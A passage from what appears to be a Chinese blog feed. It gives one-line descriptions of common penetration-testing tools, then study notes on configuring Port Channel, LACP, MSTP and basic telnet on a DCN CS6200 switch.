href="https://t0data.gitbooks.io/burpsuite/content/">教程</a>：感谢t0大佬</p><p>一款全平台集成型的渗透测试工具</p><h2 id="hackbar"><a href="#hackbar" class="headerlink" title="hackbar"></a>hackbar</h2><p>[chrome插件]</p><p>方便手工SQL注入</p><h2 id="Proxy-SwitchyOmega"><a href="#Proxy-SwitchyOmega" class="headerlink" title="Proxy SwitchyOmega"></a>Proxy SwitchyOmega</h2><p>[chrome插件]</p><p>切换代理很方便</p><h2 id="ExifTool"><a href="#ExifTool" class="headerlink" title="ExifTool"></a>ExifTool</h2><p>各种文件的元数据查看和更改工具（比如隐写）</p><h2 id="Binwalk"><a href="#Binwalk" class="headerlink" title="Binwalk"></a><a href="https://github.com/ReFirmLabs/binwalk">Binwalk</a></h2><p>是一款快速、易用，用于分析，逆向工程和提取固件映像的工具。 简单易用，完全自动化脚本，并通过自定义签名，提取规则和插件模块，还重要一点的是可以轻松地扩展。 在CTF的MISC类题型和IOT安全的固件解包分析中广泛应用，可以大大提高效率。</p>]]></content>
      
      
      <categories>
          
          <category> 个人技术心得 </category>
          
          <category> 渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Port_channel</title>
      <link href="/Internet-equipment/DCN/CS6200-28X-EI/Port-channel.html"/>
      <url>/Internet-equipment/DCN/CS6200-28X-EI/Port-channel.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>Port Channel是一组物理端口的集合体，在逻辑上被当作一个物理端口。对用户来讲，完全可以将这个Port Channel当作一个端口使用，因此不仅能增加网络的带宽，还能提供链路的备份功能。</p><p>交换机提供了两种配置端口汇聚的方法：手工生成Port Channel、LACP（Link Aggregation Control Protocol）动态生成Port Channel。只有双工模式为全双工模式的端口才能进行端口汇聚。</p><p>一些命令不能在port-channel上的端口使用，包括：arp，bandwidth，ip，ip-forward等</p></blockquote><span id="more"></span><h2 id="同一组Port-channel"><a href="#同一组Port-channel" class="headerlink" title="同一组Port channel"></a>同一组Port channel</h2><p>为使Port Channel正常工作，本交换机Port Channel的成员端口必须具备以下相同的属性：</p><ul><li>端口均为全双工模式</li><li>端口速率相同</li><li>端口同为Access端口并且属于同一个VLAN或同为Trunk端口或同为hybrid端口</li><li>如果端口同为Trunk端口或同为hybrid端口，则其Allowed VLAN和Native VLAN属性也应该相同</li></ul><blockquote><p>选举出Port Channel中端口号最小的端口作为Port Channel的主端口（Master Port）</p><p>若打开Spanning-tree功能，Spanning-tree视Port Channel为一个逻辑端口，由主端口发送BPDU帧</p><p>最大组数为128个，组内最多的端口数为8个</p></blockquote><h2 id="LACP汇聚"><a href="#LACP汇聚" class="headerlink" title="LACP汇聚"></a>LACP汇聚</h2><h3 id="端口状态"><a href="#端口状态" class="headerlink" title="端口状态"></a>端口状态</h3><blockquote><p>如果当前的成员端口数量超过了最大端口数的限制, 本端系统和对端系统会进行协商决定端口的状态</p></blockquote><p><strong>selected</strong>: 收发LACP报文, 转发用户数据</p><p><strong>standby</strong>: 收发LACP报文, 不转发用户数据</p><p>优先比较以下值, 小的为selected:</p><p>系统优先级&gt;系统MAC地址&gt;端口优先级&gt;端口号</p><blockquote><p>在一个汇聚组中, 处于selected状态且端口号最小的端口为汇聚组的主端口, 其他处于selected状态的端口为汇聚组的成员端口</p></blockquote><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># config</span></span><br><span class="line"><span class="comment"># 创建port group</span></span><br><span class="line">port<span class="literal">-group</span> &lt;port<span class="literal">-group</span><span class="literal">-number</span>&gt;</span><br><span class="line"><span class="comment"># 设置LACP协议的系统优先级</span></span><br><span class="line">lacp system<span class="literal">-priority</span> &lt;system<span class="literal">-priority</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 端口模式</span></span><br><span class="line"><span class="comment"># 将该端口加入port group并设置模式, on表示静态</span></span><br><span class="line"><span class="comment"># active与passive相对 (一台交换机active, 一台passive)</span></span><br><span class="line">port<span class="literal">-group</span> &lt;port<span class="literal">-group</span><span class="literal">-number</span>&gt; mode &#123;active | passive | on&#125;</span><br><span class="line"><span class="comment"># 设置端口优先级</span></span><br><span class="line">lacp port<span class="literal">-priority</span> &lt;port<span class="literal">-priority</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入port-channel配置模式</span></span><br><span class="line">interface port<span class="literal">-channel</span> &lt;port<span class="literal">-channel</span><span class="literal">-number</span>&gt;</span><br><span class="line">  bpdu<span class="literal">-tunnel</span><span class="literal">-protocol</span>  Bpdu隧道</span><br><span class="line">  description           设置别名</span><br><span class="line">  dot1q<span class="literal">-tunnel</span>          Dot1q隧道</span><br><span class="line">  <span class="keyword">end</span>                   结束当前模式并转换到EXEC模式</span><br><span class="line">  erps<span class="literal">-ring</span>             运行G.<span class="number">8032</span>协议的以太网环</span><br><span class="line">  ethernet              以太网</span><br><span class="line">  <span class="keyword">exit</span>                  结束当前模式并返回上一次模式</span><br><span class="line">  fulleaps              升级的以太网自动保护倒换协议</span><br><span class="line">  gvrp                  打开GVRP</span><br><span class="line">  help                  交互系统描述</span><br><span class="line">  igmp                  因特网组管理协议</span><br><span class="line">  interface             选择要配置的接口</span><br><span class="line">  ip                    IP协议配置命令</span><br><span class="line">  ipv6                  IPv6信息</span><br><span class="line">  language              设置语言</span><br><span class="line">  mac<span class="literal">-notification</span>      MAC地址信息公告报文发送</span><br><span class="line">  mrpp                  多环路自动保护协议</span><br><span class="line">  no                    取消某命令或配置交换机缺省值</span><br><span class="line">  pppoe                 添加链路标识功能 </span><br><span class="line">  shutdown              关闭所选端口</span><br><span class="line">  spanning<span class="literal">-tree</span>         生成树配置</span><br><span class="line">  switchport            设置交换机端口特性</span><br><span class="line">  ulpp                  上行链路保护功能 </span><br><span class="line">  ulsm                  上行链路状态监控</span><br><span class="line">  vlan                  VLAN命令</span><br><span class="line">  vlan<span class="literal">-tag</span>              配置 vlan<span class="literal">-tag</span>状态</span><br><span class="line">  vlan<span class="literal">-translation</span>      VLAN转换</span><br></pre></td></tr></table></figure><blockquote><p>动态与静态的区别</p><p>动态: 加入group时不会拆散原来的group</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络设备配置 </category>
          
          <category> 神州 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技能大赛-信息安全 </tag>
            
            <tag> CS6200-28X-EI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSTP</title>
      <link href="/Internet-equipment/DCN/CS6200-28X-EI/MSTP.html"/>
      <url>/Internet-equipment/DCN/CS6200-28X-EI/MSTP.html</url>
      
        <content type="html"><![CDATA[<blockquote><p> 了解MSTP, 在CS6200上进行配置</p></blockquote><span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>它应用RSTP的快速收敛特性，允许多个具有相同拓扑的VLAN映射到一个生成树实例上，而这个生成树拓扑同其它生成树实例相互独立。这种机制一方面用多重生成树实例为映射到它的VLAN的数据流量提供了独立的发送路径，实现不同实例间VLAN数据流量的负载分担；另一方面，若干个VLAN共享同一个拓扑实例（MSTI），同每个VLAN对应一个生成树（PVST）的实现方法相比，大大减少了每个网桥需要维持的生成树实例的数量，节约了CPU资源</p></blockquote><p>MSTP把一个交换网络划分成多个域，每个域内形成多棵生成树，生成树之间彼此独立。每棵生成树叫做一个多生成树实例MSTI（Multiple Spanning Tree Instance），每个域叫做一个MST域（MST Region：Multiple Spanning Tree Region）</p><p>域用来解决如何判断某个VLAN映射到哪个生成树实例的问题</p><ul><li><p><strong>在同一个MST域（MST Region）必须满足以下条件</strong></p><ul><li>都启动了MSTP</li><li><strong>域名</strong>（Region Name）</li><li><strong>修订级别</strong>（Revision Level）</li><li><strong>格式选择器</strong>（Configuration Identifier FormatSelector）</li><li><strong>VLAN与实例的映射关系</strong>（mapping of VIDs to spanning trees）…</li></ul></li><li><p><strong>VLAN映射表：</strong></p><ul><li><p>VLAN映射表是MST域的属性，它描述了VLAN和MSTI之间的映射关系</p></li><li><p>在BPDU里是一个摘要, 该摘要是根据映射关系计算得到的一个16字节签名</p></li></ul></li><li><p><strong>CST</strong></p><p>公共生成树CST（Common Spanning Tree）是<strong>连接交换网络内所有MST域</strong>的一棵生成树。</p><p>如果把每个MST域看作是一个节点，CST就是这些节点通过STP或RSTP协议计算生成的一棵生成树。</p></li><li><p><strong>IST</strong></p><p>内部生成树IST（Internal Spanning Tree）是<strong>各MST域内</strong>的一棵生成树。</p><p>IST是一个特殊的MSTI，MSTI的ID为0，通常称为MSTI0。</p><p>IST是CIST在MST域中的一个片段。</p></li><li><p><strong>SST</strong></p><p>运行STP或RSTP的交换设备只能属于一个生成树。</p><p>MST域中只有一个交换设备时，这个交换设备构成单生成树。</p></li><li><p><strong>CIST</strong></p><p><em>所有MST域的IST+CST</em>即构成了一个完整的生成树, 即CIST</p></li><li><p><strong>总根</strong></p><p>总根是CIST（Common and Internal Spanning Tree）的根桥。</p></li><li><p><strong>域根</strong></p><p>域根（Regional Root）分为IST域根和MSTI域根。</p><p>一个MST域内可以生成多棵生成树，每棵生成树都称为一个MSTI。MSTI域根是每个多生成树实例的树根。</p></li><li><p><strong>主桥</strong></p><p>主桥（Master Bridge）也就是IST Master，它是域内距离总根最近的交换设备。</p></li><li><p><strong>端口角色</strong></p><p>根端口、指定端口、Alternate端口、Backup端口和边缘端口的作用同RSTP协议中定义。</p><p>除边缘端口外，其他端口角色都参与MSTP的计算过程。</p><p>同一端口在不同的生成树实例中可以担任不同的角色。</p></li></ul><p>所谓”实例”就是多个VLAN的一个集合。在MSTP中，各个实例拓扑的计算是独立的，一个MSTP实例单独计算一棵生成树，在这些实例上就可以实现负载均衡。使用的时候可以把多个相同拓扑结构的VLAN映射到同一个实例中，这些VLAN在端口上的转发状态将取决于对应实例在MSTP里的转发状态。</p><h2 id="端口角色"><a href="#端口角色" class="headerlink" title="端口角色"></a>端口角色</h2><blockquote><p>STP需要做两件事情：选举根桥、确定端口角色。</p></blockquote><h3 id="外部与内部路径开销ExtRPC＆IntRPC"><a href="#外部与内部路径开销ExtRPC＆IntRPC" class="headerlink" title="外部与内部路径开销ExtRPC＆IntRPC"></a>外部与内部路径开销ExtRPC＆IntRPC</h3><p><strong>外部路径开销</strong>是相对于CIST而言的，同一个域内外部路径开销是相同的；<strong>内部路径开销</strong>是域内相对于某个实例而言的，同一端口对于不同实例对应不同的内部路径开销。</p><h3 id="域边缘端口"><a href="#域边缘端口" class="headerlink" title="域边缘端口"></a>域边缘端口</h3><p><strong>域边缘端口</strong>是指位于MST域的边缘并连接其它MST域或SST的端口</p><h3 id="Alternate端口"><a href="#Alternate端口" class="headerlink" title="Alternate端口"></a>Alternate端口</h3><p>Alternate端口是根端口的<strong>备份端口</strong>，如果根端口被阻塞后，Alternate端口将成为新的根端口</p><h3 id="Backup端口"><a href="#Backup端口" class="headerlink" title="Backup端口"></a>Backup端口</h3><p>当同一台交换机的两个端口互相连接时就存在一个环路，此时交换机会将其中一个端口阻塞，Backup端口就是<strong>被阻塞</strong>的那个端口。</p><p>从转发用户流量来看，Backup端口，作为<strong>指定端口的备份</strong></p><h3 id="Master端口"><a href="#Master端口" class="headerlink" title="Master端口"></a>Master端口</h3><p>Master端口是MST域和总根相连的所有路径中<strong>最短路径</strong>上的端口，它是交换机上连接MST域到总根的端口。Master端口是域中的报文去往总根的必经之路。</p><p><em>Master端口是特殊域边缘端口，Master端口在IST/CIST上的角色是Root Port，在其它各实例上的角色都是Master。</em></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><blockquote><p>我只用3个交换机测试, 所以只有一个域</p><p>即CIST=IST</p><p>CIST总根=IST域根</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开启生成树(默认mstp), 开启后才能设置其他mode域</span></span><br><span class="line">spanning<span class="literal">-tree</span></span><br><span class="line"><span class="comment"># 查看</span></span><br><span class="line">show spanning<span class="literal">-tree</span></span><br></pre></td></tr></table></figure><h3 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h3><p>&lt;暂时未画..&gt;</p><p>各交换机参数如下(改过S1的优先级):</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">S1<span class="comment">#show spanning-tree </span></span><br><span class="line"></span><br><span class="line">*********************************** <span class="keyword">Process</span> <span class="number">0</span> ***********************************</span><br><span class="line">                 -- MSTP Bridge Config Info --</span><br><span class="line"></span><br><span class="line">Standard     :  IEEE <span class="number">802.1</span>s</span><br><span class="line">Bridge MAC   :  <span class="number">00</span>:<span class="number">03</span>:<span class="number">0</span>f:<span class="number">91</span>:<span class="number">05</span>:<span class="number">2</span>f</span><br><span class="line">Bridge Times :  Max Age <span class="number">20</span>, Hello Time <span class="number">2</span>, Forward Delay <span class="number">15</span></span><br><span class="line">Force Version:  <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">########################### Instance 0 ###########################</span></span><br><span class="line">Self Bridge Id   : <span class="number">28672.00</span>:<span class="number">03</span>:<span class="number">0</span>f:<span class="number">91</span>:<span class="number">05</span>:<span class="number">2</span>f</span><br><span class="line">Root Id          : this <span class="keyword">switch</span></span><br><span class="line">Ext.RootPathCost : <span class="number">0</span></span><br><span class="line">Region Root Id   : this <span class="keyword">switch</span></span><br><span class="line">Int.RootPathCost : <span class="number">0</span></span><br><span class="line">Root Port ID     : <span class="number">0</span></span><br><span class="line">Current port list <span class="keyword">in</span> Instance <span class="number">0</span>:  </span><br><span class="line">Ethernet1/<span class="number">0</span>/<span class="number">1</span> Ethernet1/<span class="number">0</span>/<span class="number">2</span> Ethernet1/<span class="number">0</span>/<span class="number">3</span> (Total <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">   PortName           ID      ExtRPC   IntRPC  State Role     DsgBridge          DsgPort</span><br><span class="line">-------------- ------------ --------- --------- ---  ---- ------------------ ------------</span><br><span class="line">  Ethernet1/<span class="number">0</span>/<span class="number">1</span>   <span class="number">128.00001</span>          <span class="number">0</span>         <span class="number">0</span> FWD  DSGN <span class="number">28672.00030</span>f91052f   <span class="number">128.00001</span></span><br><span class="line">  Ethernet1/<span class="number">0</span>/<span class="number">2</span>   <span class="number">128.00002</span>          <span class="number">0</span>         <span class="number">0</span> FWD  DSGN <span class="number">28672.00030</span>f91052f   <span class="number">128.00002</span></span><br><span class="line">  Ethernet1/<span class="number">0</span>/<span class="number">3</span>   <span class="number">128.00003</span>          <span class="number">0</span>         <span class="number">0</span> FWD  DSGN <span class="number">28672.00030</span>f91052f   <span class="number">128.00003</span></span><br><span class="line"> </span><br><span class="line">S2<span class="comment">#show spanning-tree </span></span><br><span class="line"></span><br><span class="line">*********************************** <span class="keyword">Process</span> <span class="number">0</span> ***********************************</span><br><span class="line">                 -- MSTP Bridge Config Info --</span><br><span class="line"></span><br><span class="line">Standard     :  IEEE <span class="number">802.1</span>s</span><br><span class="line">Bridge MAC   :  <span class="number">00</span>:<span class="number">03</span>:<span class="number">0</span>f:<span class="number">91</span>:<span class="number">05</span>:b0</span><br><span class="line">Bridge Times :  Max Age <span class="number">20</span>, Hello Time <span class="number">2</span>, Forward Delay <span class="number">15</span></span><br><span class="line">Force Version:  <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">########################### Instance 0 ###########################</span></span><br><span class="line">Self Bridge Id   : <span class="number">32768.00</span>:<span class="number">03</span>:<span class="number">0</span>f:<span class="number">91</span>:<span class="number">05</span>:b0</span><br><span class="line">Root Id          : <span class="number">28672.00</span>:<span class="number">03</span>:<span class="number">0</span>f:<span class="number">91</span>:<span class="number">05</span>:<span class="number">2</span>f</span><br><span class="line">Ext.RootPathCost : <span class="number">0</span></span><br><span class="line">Region Root Id   : <span class="number">28672.00</span>:<span class="number">03</span>:<span class="number">0</span>f:<span class="number">91</span>:<span class="number">05</span>:<span class="number">2</span>f</span><br><span class="line">Int.RootPathCost : <span class="number">20000</span></span><br><span class="line">Root Port ID     : <span class="number">128.3</span></span><br><span class="line">Current port list <span class="keyword">in</span> Instance <span class="number">0</span>:  </span><br><span class="line">Ethernet1/<span class="number">0</span>/<span class="number">3</span> Ethernet1/<span class="number">0</span>/<span class="number">4</span> (Total <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">   PortName           ID      ExtRPC   IntRPC  State Role     DsgBridge          DsgPort</span><br><span class="line">-------------- ------------ --------- --------- ---  ---- ------------------ ------------</span><br><span class="line">  Ethernet1/<span class="number">0</span>/<span class="number">3</span>   <span class="number">128.00003</span>          <span class="number">0</span>         <span class="number">0</span> FWD  ROOT <span class="number">28672.00030</span>f91052f   <span class="number">128.00003</span></span><br><span class="line">  Ethernet1/<span class="number">0</span>/<span class="number">4</span>   <span class="number">128.00004</span>          <span class="number">0</span>     <span class="number">20000</span> BLK  ALTR <span class="number">32768.00030</span>f90ce0d   <span class="number">128.00004</span></span><br><span class="line">  </span><br><span class="line">S3<span class="comment">#show spanning-tree </span></span><br><span class="line"></span><br><span class="line">*********************************** <span class="keyword">Process</span> <span class="number">0</span> ***********************************</span><br><span class="line">                 -- MSTP Bridge Config Info --</span><br><span class="line"></span><br><span class="line">Standard     :  IEEE <span class="number">802.1</span>s</span><br><span class="line">Bridge MAC   :  <span class="number">00</span>:<span class="number">03</span>:<span class="number">0</span>f:<span class="number">90</span>:ce:<span class="number">0</span>d</span><br><span class="line">Bridge Times :  Max Age <span class="number">20</span>, Hello Time <span class="number">2</span>, Forward Delay <span class="number">15</span></span><br><span class="line">Force Version:  <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">########################### Instance 0 ###########################</span></span><br><span class="line">Self Bridge Id   : <span class="number">32768.00</span>:<span class="number">03</span>:<span class="number">0</span>f:<span class="number">90</span>:ce:<span class="number">0</span>d</span><br><span class="line">Root Id          : <span class="number">28672.00</span>:<span class="number">03</span>:<span class="number">0</span>f:<span class="number">91</span>:<span class="number">05</span>:<span class="number">2</span>f</span><br><span class="line">Ext.RootPathCost : <span class="number">0</span></span><br><span class="line">Region Root Id   : <span class="number">28672.00</span>:<span class="number">03</span>:<span class="number">0</span>f:<span class="number">91</span>:<span class="number">05</span>:<span class="number">2</span>f</span><br><span class="line">Int.RootPathCost : <span class="number">20000</span></span><br><span class="line">Root Port ID     : <span class="number">128.2</span></span><br><span class="line">Current port list <span class="keyword">in</span> Instance <span class="number">0</span>:  </span><br><span class="line">Ethernet1/<span class="number">0</span>/<span class="number">2</span> Ethernet1/<span class="number">0</span>/<span class="number">4</span> (Total <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">   PortName       ID      ExtRPC   IntRPC  State Role     DsgBridge      DsgPort</span><br><span class="line">-------------- -------- --------- --------- ---  ---- ------------------ --------</span><br><span class="line"> Ethernet1/<span class="number">0</span>/<span class="number">2</span> <span class="number">128.002</span>          <span class="number">0</span>         <span class="number">0</span> FWD  ROOT <span class="number">28672.00030</span>f91052f <span class="number">128.002</span></span><br><span class="line"> Ethernet1/<span class="number">0</span>/<span class="number">4</span> <span class="number">128.004</span>          <span class="number">0</span>     <span class="number">20000</span> FWD  DSGN <span class="number">32768.00030</span>f90ce0d <span class="number">128.004</span></span><br></pre></td></tr></table></figure><ul><li><code>Current port list in Instance 0:</code>默认所有vlan都映射到intance 0</li><li><code>intRPC</code>: 内部开销</li><li><code>extRPC</code>: 外部开销</li><li><code>Region Root Id</code>: 域根</li><li><code>Root Port ID: 128.3</code>: 根端口(port_pri.vlan_id)</li><li><code>DsgBridge</code>: 指定桥, 上游交换机给我发的BPDU的桥ID(bridge_pri.mac)</li><li><code>Designate Port</code>: 上游交换机给我发BPDU的端口</li></ul><h3 id="选举根桥"><a href="#选举根桥" class="headerlink" title="选举根桥"></a>选举根桥</h3><p>接收BPDU, 比较BID–&gt;先比较优先级，优先级值越小，优先级越高。如果优先级相同，则比较MAC地址大小，越小越优</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更改优先级</span></span><br><span class="line">S3(config)<span class="comment">#spanning-tree priority ?</span></span><br><span class="line">  &lt;<span class="number">0</span><span class="literal">-61440</span>&gt;  Priority value &lt;<span class="number">0</span><span class="literal">-61440</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更改在实例里的优先级</span></span><br><span class="line">spanning<span class="literal">-tree</span> mst &lt;instance<span class="literal">-id</span>&gt; priority &lt;bridge<span class="literal">-priority</span>&gt;</span><br></pre></td></tr></table></figure><blockquote><p>根桥选出后，其他交换机都可以叫指定桥。指定桥不再主动发出BPDU，只会转发根桥的BPDU。根桥每间隔Hello Time（默认2秒）时间周期性发出BPDU。</p></blockquote><h3 id="根端口"><a href="#根端口" class="headerlink" title="根端口"></a><strong>根端口</strong></h3><blockquote><p>PID共占2个字节，其中，优先级与端口索引号各占1字节。但为了避免端口索引号不够用，把优先级中的低4位保留用于端口索引号，一般取值为0000。高4位优先级默认二进制取值为1000，所以端口优先级默认为128, 低4位无意义, step为16</p></blockquote><p>对比哪个离根桥最近, 也就是对比RPC(root path cost)</p><p>如果RPC相同, 还有几个参数提供选择: <strong>指定BID</strong>&gt;<strong>指定Port ID</strong>&gt;<strong>自身端口PID(优先级&gt;端口编号)</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 端口下</span></span><br><span class="line"><span class="comment"># 更改优先级</span></span><br><span class="line">spanning<span class="literal">-tree</span> mst &lt;instance<span class="literal">-id</span>&gt; port<span class="literal">-priority</span> &lt;port<span class="literal">-priority</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="指定端口"><a href="#指定端口" class="headerlink" title="指定端口"></a>指定端口</h3><p>cost小的就是指定端口</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 端口模式下</span></span><br><span class="line"><span class="comment"># 更改cost</span></span><br><span class="line">spanning<span class="literal">-tree</span> mst &lt;instance<span class="literal">-id</span>&gt; port<span class="literal">-priority</span> &lt;port<span class="literal">-priority</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="配置MSTP域"><a href="#配置MSTP域" class="headerlink" title="配置MSTP域"></a>配置MSTP域</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># config</span></span><br><span class="line"><span class="comment"># 进入MSTP域配置模式</span></span><br><span class="line">spanning<span class="literal">-tree</span> mst configuration</span><br><span class="line"><span class="comment"># 域名</span></span><br><span class="line">name &lt;name&gt;</span><br><span class="line"><span class="comment"># 创建实例+配置vlan与实例的映射关系</span></span><br><span class="line">instance &lt;instance<span class="literal">-id</span>&gt; vlan &lt;vlan<span class="literal">-list</span>&gt;</span><br><span class="line"><span class="comment"># 修订级别</span></span><br><span class="line">revision<span class="literal">-level</span> &lt;level&gt;</span><br><span class="line"><span class="comment"># 退出不保存</span></span><br><span class="line">abort</span><br><span class="line"><span class="comment"># 退出保存</span></span><br><span class="line"><span class="keyword">exit</span></span><br></pre></td></tr></table></figure><h3 id="PORTFAST"><a href="#PORTFAST" class="headerlink" title="PORTFAST"></a>PORTFAST</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 端口模式下</span></span><br><span class="line"><span class="comment"># postfast与bpdugurad</span></span><br><span class="line">spanning<span class="literal">-tree</span> portfast [<span class="type">bpdufilter</span> | <span class="type">bpduguard</span>] [<span class="type">recovery</span> &lt;<span class="number">30</span>-<span class="number">3600</span>&gt;]</span><br></pre></td></tr></table></figure><blockquote><p>参考</p><p><a href="https://cshihong.github.io/2017/11/29/MSTP%E5%A4%9A%E5%8C%BA%E5%9F%9F%E7%94%9F%E6%88%90%E6%A0%91%E5%8D%8F%E8%AE%AE/">mstp</a></p><p><a href="https://bbs.huaweicloud.com/blogs/220510">这篇MSTP是真的爱了！</a>(图解易懂)</p><p><a href="https://zhuanlan.zhihu.com/p/139844708">网络工程师（21）：STP怎么选根桥和根端口(图解易懂)</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络设备配置 </category>
          
          <category> 神州 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技能大赛-信息安全 </tag>
            
            <tag> CS6200-28X-EI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>交换机基础配置</title>
      <link href="/Internet-equipment/DCN/CS6200-28X-EI/Basic.html"/>
      <url>/Internet-equipment/DCN/CS6200-28X-EI/Basic.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>记录一些实用的用法, 我的环境是Version 7.5.3.2(R0004.0030)</p></blockquote><span id="more"></span><h2 id="vlan"><a href="#vlan" class="headerlink" title="vlan"></a>vlan</h2><table><thead><tr><th>全局</th><th>作用</th></tr></thead><tbody><tr><td><code>show vlan</code></td><td>vlan brief</td></tr><tr><td><code>interface ethernet &lt;interface-list&gt;</code></td><td>进入一个或多个VLAN, 不连续用 <code>;</code>, 连续用 <code>-</code></td></tr></tbody></table><ul><li>默认VLAN是可以互相通信的(自动启用路由功能)</li></ul><h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 配置用户</span></span><br><span class="line">username &lt;username&gt; <span class="function">[<span class="type">privilege</span> &lt;<span class="type">privilege</span>&gt;] <span class="title">password</span></span> (<span class="number">0</span> | <span class="number">7</span>) &lt;password&gt;</span><br><span class="line"><span class="comment"># 开启服务</span></span><br><span class="line">telnet<span class="literal">-server</span> enable</span><br><span class="line"><span class="comment"># 启用ACL</span></span><br><span class="line">authentication line vty login local</span><br><span class="line"><span class="comment"># 启用该IP作为安全IP</span></span><br><span class="line">authentication securityip &lt;ip<span class="literal">-addr</span>&gt;</span><br></pre></td></tr></table></figure><blockquote><p><code>show users</code>可查看telnet和ssh登录的用户</p></blockquote><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 